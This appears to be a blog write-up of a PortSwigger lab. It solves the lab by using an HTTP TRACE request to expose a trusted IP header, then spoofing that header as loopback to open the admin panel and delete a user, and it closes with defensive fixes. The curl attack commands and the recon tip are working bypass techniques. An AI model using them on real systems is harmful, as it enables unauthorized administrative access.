---
layout: post
title: "PortSwigger: Authentication Bypass via Information Disclosure"
date: 2027-10-14 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, InformationDisclosure]
tags: [portswigger, information-disclosure, authentication-bypass, trace-method, http-headers, x-forwarded-for, access-control, cwe-290, cwe-200]
---

An admin panel that's "only available to local users" sounds safe — until you ask *how* the server decides you're local. In this lab it reads your IP from an HTTP header that the front-end adds, and trusts whatever value shows up. The hard part isn't spoofing the header; it's *learning the header exists*. The debug `TRACE` method hands you exactly that. This is [CWE-290](https://cwe.mitre.org/data/definitions/290.html) (Authentication Bypass by Spoofing), unlocked by a slice of [CWE-200](https://cwe.mitre.org/data/definitions/200.html) (Information Disclosure).

## Overview

There's an admin panel that can delete users. Visiting it as a normal user gets you a polite refusal:

```bash
curl -sk 'https://<lab-id>.web-security-academy.net/admin'
#   -> "Admin interface only available to local users"
```

So the gate is the *source IP*, not your login. The question is which signal the server uses to judge that — and whether we control it.

## TRACE: the server tells on itself

`TRACE` is a rarely-used HTTP method that echoes your request back to you in the response body — but only *after* the front-end proxy has processed it. That means any header the proxy quietly bolted on appears in the echo, even though you never sent it.

```bash
curl -sk -X TRACE 'https://<lab-id>.web-security-academy.net/admin'
```

```
TRACE /admin HTTP/1.1
Host: <lab-id>.web-security-academy.net
user-agent: curl/8.19.0
accept: */*
Content-Length: 0
X-Custom-IP-Authorization: 73.135.103.228
```

That last line is the giveaway. I never sent `X-Custom-IP-Authorization` — the front-end added it, set to my real public IP, and the back-end uses it for the "local user" check. TRACE just leaked both the header's *name* and the fact that it drives authorization.

## Spoof it local

The back-end trusts that header from the wire instead of deriving the IP from the actual TCP connection. So I send it myself, set to loopback:

```bash
# panel renders now
curl -sk 'https://<lab-id>.web-security-academy.net/admin' \
  -H 'X-Custom-IP-Authorization: 127.0.0.1'

# delete the victim (HTTP 302 = done)
curl -sk 'https://<lab-id>.web-security-academy.net/admin/delete?username=carlos' \
  -H 'X-Custom-IP-Authorization: 127.0.0.1'
```

The lab status flips to **Solved**.

## Why it worked

Two flaws stack into a full authentication bypass:

1. **TRACE disclosed the trusted header.** Without it, the `X-Custom-IP-Authorization` header is invisible — the front-end overwrites whatever you send, so you'd never know it was the thing being checked. TRACE echoes the *post-proxy* request, exposing the internal header by name.
2. **The IP check trusts a client-suppliable header.** Source IP should come from the trusted proxy connection, not from a header an attacker can set. Because it doesn't, `127.0.0.1` is a one-line impersonation of a local request.

This generalises to any `X-Forwarded-For`, `X-Real-IP`, or `X-Originating-IP` ACL — if the app reads the header instead of the connection, you own the decision. When you see "internal/local only," run `TRACE` (or `nmap --script http-methods`) and diff the echoed headers against what you sent; anything extra is a spoofable trust anchor.

## The fix

- **Disable `TRACE` and `TRACK`** at the edge — they leak internal headers and have no production use.
- **Never make access-control decisions on a client-suppliable header.** Derive the source IP from the trusted proxy connection, and strip inbound `X-Custom-IP-Authorization` / `X-Forwarded-For` / `X-Real-IP` before the app sees them, then set them authoritatively.
- **Gate admin features on an authenticated session and role**, not on an IP heuristic.
